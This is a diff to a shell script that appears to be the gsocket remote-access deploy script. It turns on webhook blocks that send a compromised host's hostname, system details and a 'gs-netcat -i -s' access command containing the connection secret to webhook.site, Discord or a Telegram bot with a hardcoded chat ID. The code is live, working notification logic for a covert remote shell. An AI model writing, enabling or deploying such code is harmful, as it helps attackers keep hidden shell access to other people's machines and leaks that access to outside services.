@@ -95,26 +95,26 @@ GS_TG_CHATID="1603160876"
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
 }
-### Generic URL as webhook (any URL)
-# [[ -n $GS_WEBHOOK ]] && {
-# 	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
-# 	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
-# }
-# ### webhook.site
-# GS_WEBHOOK_KEY=""
-# [[ -n $GS_WEBHOOK_KEY ]] && {
-# 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-# 	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
-# 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-# 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-# }
-### discord webhook
-# GS_DISCORD_KEY=""
-# [[ -n $GS_DISCORD_KEY ]] && {
-# 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
-# 	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-# 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-# }
+## Generic URL as webhook (any URL)
+[[ -n $GS_WEBHOOK ]] && {
+	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
+}
+### webhook.site
+GS_WEBHOOK_KEY=""
+[[ -n $GS_WEBHOOK_KEY ]] && {
+	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+}
+## discord webhook
+GS_DISCORD_KEY=""
+[[ -n $GS_DISCORD_KEY ]] && {
+	data='{"username": "gsocket", "content": "'"${msg}"'"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+}
 unset data
 unset msg
  
